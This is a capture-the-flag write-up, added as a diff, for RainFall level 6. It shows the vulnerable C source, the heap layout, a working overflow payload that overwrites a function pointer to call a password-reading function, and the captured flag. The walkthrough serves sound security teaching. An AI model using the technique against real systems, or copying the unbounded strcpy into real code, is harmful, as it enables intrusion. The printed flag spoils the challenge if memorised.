@@ -1,0 +1,87 @@
+# Level 6
+
+## Vulnerability
+Heap overflow overwriting function pointer.
+
+## Code Analysis
+We  find an executable who segfault without parameter and print Nope . 
+
+level6@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
+level6@RainFall:~$ ./level6 
+Segmentation fault (core dumped)
+level6@RainFall:~$ ./level6  ddddddd 
+Nope
+level6@RainFall:~$ 
+After analyze source.c  we can see that the main() function call a function named m() but there is also a non-called n() function.
+Lets talk about the main().
+```c
+void n(void) {
+    system("/bin/cat /home/user/level7/.pass");  // Target function
+}
+
+void m(void) {
+    puts("Nope");  // Default function
+}
+
+void main(int argc, char **argv) {
+    char *buffer = malloc(64);      // 64-byte buffer
+    void **func_ptr = malloc(4);    // Function pointer
+    
+    *func_ptr = m;                  // Points to m() by default
+    strcpy(buffer, argv[1]);        // OVERFLOW: No bounds check!
+    (*func_ptr)();                  // Call function pointer
+}
+```
+
+## Heap Layout
+```
++------------------+
+| 64 bytes buffer  | ← buffer starts here
++------------------+
+| 8 bytes metadata | ← malloc bookkeeping
++------------------+
+| 4 bytes pointer  | ← func_ptr (points to m)
++------------------+
+```
+
+## Solution Steps
+
+1. **Find target function address**
+```bash
+   objdump -t level6 | grep " n"
+   # 08048454 g     F .text    n
+```
+
+2. **Calculate overflow**
+   - Buffer size: 64 bytes
+   - Malloc metadata: 8 bytes
+   - Total padding: 64 + 8 = 72 bytes
+
+3. **Exploit**
+```bash
+
+   ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+
+```
+   - `"A"*72`: Fill buffer + metadata
+   - `\x54\x84\x04\x08`: Address of `n()` (little-endian)
+
+4. **Get flag**
+```
+   f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+   
+```
+
+## Key Concept
+**Heap Overflow**: `strcpy()` with no size check allows overflowing the buffer, crossing malloc metadata, and overwriting the function pointer to redirect execution from `m()` to `n()`.
+
+## Attack Flow
+```
+Input: AAAA...AAA[72 bytes] + \x54\x84\x04\x08
+                                    ↓
+                            Overwrites func_ptr
+                                    ↓
+                            Calls n() instead of m()
+```
